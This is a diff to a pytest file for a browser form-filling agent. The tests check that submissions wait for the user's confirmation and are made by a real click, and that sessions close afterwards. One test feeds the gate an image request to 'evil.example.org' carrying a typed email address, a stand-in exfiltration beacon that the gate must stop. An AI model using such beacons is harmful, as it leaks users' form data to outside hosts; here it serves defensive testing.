@@ -37,7 +37,7 @@ def world(monkeypatch, brain_db):  # noqa: F811
     monkeypatch.setattr(steel_client.config, "STEEL_API_KEY", "k")
     brain_db["sandy_users"].insert_one({"_id": "userA"})
     browser_sites.init_browser_sites(brain_db)
-    w = NS(snapshot=FORM, clients=[], opened=[], released=[], mode="submit", sent_notes=[],
+    w = NS(snapshot=FORM, clients=[], opened=[], released=[], mode="submit", sent_notes=[], pressed=[], here=True,
            filled=[{"field": "Name", "value": "Nabeel"}, {"field": "Email", "value": "n@example.com"}],
            result="<html><body><main><p>Thanks Nabeel, your application 77 was received.</p></main></body></html>")
 
@@ -54,11 +54,6 @@ def world(monkeypatch, brain_db):  # noqa: F811
                 value = w.result
             elif e == "location.href":
                 value = URL + "/thanks"
-            elif "f.submit()" in e:
-                # The held send made again from the form's page: through the gate.
-                client.handlers["Fetch.requestPaused"]({"requestId": "r10", "resourceType": "Document", "request": {
-                    "method": "POST", "url": URL, "postData": "name=Nabeel"}}, session)
-                value = True
             else:
                 value = True
             return {"result": {"value": value}}
@@ -73,24 +68,42 @@ def world(monkeypatch, brain_db):  # noqa: F811
             return {}
         return answer
 
+    def press(client):
+        def answer(params, session):
+            w.pressed.append((params["type"], session))
+            if params["type"] == "mouseReleased":
+                # The real click on the send button: the page's own send, through the gate.
+                client.handlers["Fetch.requestPaused"]({"requestId": "r10", "resourceType": "Document", "request": {
+                    "method": "POST", "url": URL, "postData": "name=Nabeel"}}, session)
+            return {}
+        return answer
+
+    def spot(params, session):
+        if "elementFromPoint" in params["functionDeclaration"]:
+            return {"result": {"value": {"x": 10, "y": 20, "here": w.here}}}
+        return {"result": {"value": True}}
+
     async def connect(url):
         client = FakeCDP()
         client.answers["Runtime.evaluate"] = evaluate(client)
         client.answers["Page.navigate"] = navigate(client)
+        client.answers["DOM.resolveNode"] = {"object": {"objectId": "o7"}}
+        client.answers["Runtime.callFunctionOn"] = spot
+        client.answers["Input.dispatchMouseEvent"] = press(client)
         w.clients.append(client)
         return client
 
-    async def agent(row, gate, client, tab, user_id):
+    async def agent(row, gate, client, tab, user_id, asked):
         deadline = time.monotonic() + (3 if w.mode == "slow" else 0)
         while time.monotonic() < deadline:
             now = browser_job.get(row["_id"]) or {}
             if now.get("status") in (browser_job.STOPPED, browser_job.HANDED):
                 return {"status": now["status"]}
             await asyncio.sleep(0.05)
-        gate.acted("type")
+        gate.acted("type", "Nabeel")
         gate.decide("POST", "https://forms.example.com/validate", "XHR")
-        gate.acted("click")
-        gate.decide("POST", URL, "Document", body="name=Nabeel", content_type="application/x-www-form-urlencoded")
+        # The agent is about to click send: it is stopped and he is asked.
+        asked.update(kind="click", target="t1", node=7, label="send")
         return {"status": browser_job.DONE, "result": ""}
 
     monkeypatch.setattr(browser_cdp, "connect", connect)
@@ -99,7 +112,22 @@ def world(monkeypatch, brain_db):  # noqa: F811
         "id": f"st{len(w.opened)}", "debug_url": "https://api.steel.dev/v1/sessions/st1/player"})
     monkeypatch.setattr(steel_client, "release", lambda sid, seconds=0: w.released.append(sid))
     monkeypatch.setattr(notify, "CHANNELS", [lambda r: w.sent_notes.append(r["body"])])
-    return w
+    running, real_run = [], browser_job._run
+
+    def run(job_id, user_id):
+        running.append(job_id)
+        try:
+            real_run(job_id, user_id)
+        finally:
+            running.remove(job_id)
+    monkeypatch.setattr(browser_job, "_run", run)
+    yield w
+    # A fill still held waits for an answer: it is let go, and gone before the next test.
+    brain_db[browser_job.COLLECTION].update_many({"status": {"$in": list(browser_job.OPEN)}},
+                                                 {"$set": {"status": browser_job.STOPPED}})
+    deadline = time.monotonic() + 5
+    while running and time.monotonic() < deadline:
+        time.sleep(0.05)
 
 
 def _level(level):
@@ -135,12 +163,35 @@ def test_the_send_waits_for_his_yes_and_then_goes_once(world, language):
     assert _job(job)["status"] == browser_job.HELD and world.released == []
     done = _fill(language, confirmed_job=job)
     assert done["ok"] and "application 77 was received" in done["reply"]
-    sender = world.clients[-1]
-    # His yes is the held send made again from the form's page, let through once.
-    resent = [p["expression"] for p in sender.of("Runtime.evaluate") if "f.submit()" in p["expression"]]
-    assert len(resent) == 1 and '"name=Nabeel"' in resent[0]
-    assert {"requestId": "r10"} in sender.of("Fetch.continueRequest")
+    # His yes is the real click on the same element of the same page, on the one connection.
+    [holder] = world.clients
+    assert world.pressed == [("mouseMoved", "s1"), ("mousePressed", "s1"), ("mouseReleased", "s1")]
+    assert {"backendNodeId": 7} in holder.of("DOM.resolveNode")
+    assert {"requestId": "r10"} in holder.of("Fetch.continueRequest")
+    assert not [p for p in holder.of("Runtime.evaluate") if "submit()" in p["expression"] or "fetch(" in p["expression"]]
     assert _job(job)["status"] == browser_job.DONE and world.released == ["st1"]
+
+
+def test_a_button_that_is_no_longer_where_he_said_yes_is_never_clicked(world):
+    _level("submit")
+    asked = _fill("en")
+    world.here = False
+    out = _fill("en", confirmed_job=asked["ids"][0])
+    assert out["ok"] is False and "isn't where it was" in out["reply"] and world.pressed == []
+    assert world.released == ["st1"]
+
+
+def test_the_gate_stopping_a_fill_closes_its_session_and_tells_him(world, monkeypatch):
+    _level("submit")
+
+    async def agent(row, gate, client, tab, user_id, asked):
+        gate.acted("type", "n@example.com")
+        gate.decide("GET", "https://evil.example.org/p.gif?e=n@example.com", "Image")
+        await asyncio.sleep(5)                       # cancelled: the gate stopped it
+        pytest.fail("the agent went on")
+    monkeypatch.setattr(browser_job, "AGENT", agent)
+    out = _fill("en")
+    assert out["ok"] is False and "another site" in out["reply"] and world.released == ["st1"]
 
 
 def test_his_yes_on_a_fill_that_is_gone_says_so(world):
@@ -281,10 +332,12 @@ def test_the_live_view_is_watch_only_and_his_alone_until_he_takes_over(world, cl
 
 def test_what_she_did_on_the_page_is_on_the_runs_trace(world, brain_db):  # noqa: F811
     _level("submit")
-    _fill("en")
+    asked = _fill("en")
+    _fill("en", confirmed_job=asked["ids"][0])
+    _wait_for(lambda: list(brain_db["sandy_traces"].find({"source": {"$exists": True}})))
     rows = list(brain_db["sandy_traces"].find({"source": {"$exists": True}}))
     names = [t["name"] for r in rows for t in r.get("tools", [])]
-    assert "browser_open" in names and "browser_blocked" in names and "browser_held" in names
+    assert {"browser_open", "browser_blocked", "browser_held", "browser_send"} <= set(names)
 
 
 def test_the_real_agent_is_built_on_our_model_the_sites_domains_and_the_gate(monkeypatch):
@@ -316,9 +369,10 @@ def test_the_real_agent_is_built_on_our_model_the_sites_domains_and_the_gate(mon
     monkeypatch.setattr(steel_client.config, "STEEL_API_KEY", "k")
     row = {"_id": "j1", "site": "forms.example.com", "steel_id": "st1", "goal": "apply", "args": {"details": "Name: N"}}
     gate = browser_gate.Gate("forms.example.com")
-    out = asyncio.run(browser_job._agent(row, gate, FakeCDP(), "s1", "userA"))
+    out = asyncio.run(browser_job._agent(row, gate, FakeCDP(), "s1", "userA", {}))
     assert out == {"status": browser_job.DONE, "result": "filled"} and built["stopped"]
     assert built["session"]["allowed_domains"] == ["forms.example.com", "*.forms.example.com"]
+    assert built["session"]["cross_origin_iframes"] is False
     agent = built["agent"]
     assert isinstance(agent["llm"], SandyLLM) and agent["use_judge"] is False and built["steps"] == browser_job.MAX_STEPS
     excluded = set(agent["tools"].registry.registry.actions)
@@ -327,41 +381,7 @@ def test_the_real_agent_is_built_on_our_model_the_sites_domains_and_the_gate(mon
                                         events.ClickCoordinateEvent}
     # A click the agent is about to make is the gate's to know.
     dict(handlers)[events.ClickElementEvent](NS(node=NS(xpath="//button[1]", attributes={"name": "go"})))
-    assert gate.last == {"kind": "click"}
-
-
-def test_the_held_send_is_sealed_at_rest(world, brain_db):  # noqa: F811
-    _level("submit")
-    asked = _fill("en")
-    row = brain_db[browser_job.COLLECTION].find_one({"_id": asked["ids"][0]})
-    assert "Nabeel" not in str(row["held"]) and _job(asked["ids"][0])["held"]["body"] == "name=Nabeel"
-
-
-def test_a_send_that_is_not_a_plain_form_is_made_again_as_a_fetch_with_its_own_body():
-    js = browser_job._resend_js({"method": "POST", "url": URL, "body": '{"a": 1}', "content_type": "application/json"})
-    assert js.startswith("fetch(") and '"application/json"' in js and '"{\\"a\\": 1}"' in js
-
-
-def test_what_he_filled_is_read_from_the_held_send_when_the_page_cannot_show_it(world, monkeypatch):
-    """On a real page the held send leaves an error page behind (Steel, 2 Nov 2026): the question
-    names what he filled from the send itself, never a password."""
-    _level("submit")
-    world.filled = []                                                  # the page shows nothing now
-
-    async def agent(row, gate, client, tab, user_id):
-        gate.acted("click")
-        gate.decide("POST", URL, "Document", body="custname=Sandy+Test&custemail=t%40example.com&password=x&empty=",
-                    content_type="application/x-www-form-urlencoded")
-        return {"status": browser_job.DONE, "result": ""}
-    monkeypatch.setattr(browser_job, "AGENT", agent)
-    asked = _fill("en")
-    assert "custname: Sandy Test" in asked["summary"] and "custemail: t@example.com" in asked["summary"]
-    assert "password" not in asked["summary"] and "empty" not in asked["summary"]
-
-
-def test_a_json_send_names_its_fields_too():
-    held = {"body": '{"name": "Nabeel", "age": 30, "nested": {"x": 1}}', "content_type": "application/json"}
-    assert browser_job._from_send(held) == [{"field": "name", "value": "Nabeel"}, {"field": "age", "value": "30"}]
+    assert gate.last == "click"
 
 
 # ── A no closes the session at once ──
@@ -406,3 +426,85 @@ def test_closing_a_fill_that_already_went_does_nothing(world):
     with active_user_profile_context(A):
         browser_job.let_go(asked["ids"][0])
     assert world.released == released and _job(asked["ids"][0])["status"] == browser_job.DONE
+
+
+# ── The question is on the action ──
+
+def _tools(monkeypatch, sends):
+    """The agent's tools as a fill builds them, with what browser-use itself would do recorded."""
+    import browser_use
+    from browser_use.tools.service import Tools
+
+    from app.brain import browser_gate
+    built, done = {}, []
+
+    class Session:
+        def __init__(self, **kw):
+            self.event_bus = NS(on=lambda kind, fn: None)
+
+        async def stop(self):
+            pass
+
+    class Agent:
+        def __init__(self, **kw):
+            built.update(kw)
+
+        async def run(self, max_steps):
+            return NS(final_result=lambda: "")
+
+    async def act(self, action, browser_session, *a, **kw):
+        done.append(action.model_dump(exclude_unset=True))
+        return "done by browser-use"
+    monkeypatch.setattr(browser_use, "Agent", Agent)
+    monkeypatch.setattr(browser_use, "BrowserSession", Session)
+    monkeypatch.setattr(Tools, "act", act)
+    monkeypatch.setattr(steel_client.config, "STEEL_API_KEY", "k")
+    client = FakeCDP({"DOM.resolveNode": {"object": {"objectId": "o7"}},
+                      "Runtime.callFunctionOn": {"result": {"value": sends}},
+                      "Runtime.evaluate": {"result": {"objectId": "o8"}},
+                      "DOM.describeNode": {"node": {"backendNodeId": 8, "nodeName": "INPUT",
+                                                    "attributes": ["name", "email"]}}})
+    gate = browser_gate.Gate("forms.example.com")
+    gate.sessions["t1"] = "s1"
+    asked = {}
+    row = {"_id": "j1", "site": "forms.example.com", "steel_id": "st1", "goal": "apply", "args": {}}
+    asyncio.run(browser_job._agent(row, gate, client, "s1", "userA", asked))
+    page = NS(agent_focus_target_id="t1")
+
+    async def element(index):
+        return NS(target_id="t1", backend_node_id=7, attributes={"name": "go"}, tag_name="button")
+    page.get_element_by_index = element
+
+    def run(**action):
+        return asyncio.run(built["tools"].act(NS(model_dump=lambda exclude_unset: action), page))
+    return run, asked, done, client
+
+
+def test_a_click_that_sends_is_not_made_and_he_is_asked(monkeypatch):
+    run, asked, done, client = _tools(monkeypatch, sends=True)
+    result = run(click={"index": 3})
+    assert result.is_done and done == [] and asked == {"kind": "click", "target": "t1", "node": 7, "label": "go"}
+    [call] = client.of("Runtime.callFunctionOn")
+    assert call["functionDeclaration"] == browser_job._SENDS_JS and call["objectId"] == "o7"
+
+
+def test_a_click_that_does_not_send_is_made(monkeypatch):
+    run, asked, done, _ = _tools(monkeypatch, sends=False)
+    assert run(click={"index": 3}) == "done by browser-use" and asked == {} and done == [{"click": {"index": 3}}]
+
+
+def test_an_enter_in_a_field_is_not_pressed_and_he_is_asked(monkeypatch):
+    run, asked, done, _ = _tools(monkeypatch, sends=False)
+    assert run(send_keys={"keys": "Enter"}).is_done and done == []
+    assert asked == {"kind": "enter", "target": "t1", "node": 8, "label": "email"}
+
+
+@pytest.mark.parametrize("action", [{"input": {"index": 2, "text": "Nabeel\n"}}, {"click": {"coordinate_x": 5}}])
+def test_a_line_break_typed_or_a_click_by_place_is_refused(monkeypatch, action):
+    run, asked, done, _ = _tools(monkeypatch, sends=False)
+    assert run(**action).error and done == [] and asked == {}
+
+
+def test_the_sends_check_knows_a_forms_submit_and_a_button_that_names_a_send():
+    js = browser_job._SENDS_JS
+    assert '["submit", "image"]' in js and "c.form" in js and "إرسال" in js and "submit" in js
